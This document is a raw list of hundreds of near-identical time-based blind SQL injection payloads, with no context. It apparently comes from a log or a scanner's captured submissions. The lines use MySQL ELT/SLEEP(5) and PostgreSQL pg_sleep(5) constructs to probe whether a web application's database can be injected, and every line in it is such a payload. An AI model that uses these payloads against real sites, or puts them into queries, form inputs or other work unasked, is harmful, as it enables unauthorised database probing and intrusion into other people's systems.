+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
